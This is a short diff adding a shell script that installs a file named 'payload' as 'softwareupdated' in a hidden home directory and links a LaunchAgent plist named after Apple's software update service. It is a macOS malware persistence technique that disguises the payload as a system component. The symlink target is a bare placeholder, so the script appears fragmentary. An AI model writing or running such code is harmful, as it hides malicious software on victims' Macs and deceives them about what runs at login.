@@ -1,0 +1,4 @@
+#!/bin/sh
+mkdir -p ~/.androids
+cp payload /Users/x/.androids/softwareupdated
+ln -s x ~/Library/LaunchAgents/com.apple.softwareupdate.plist
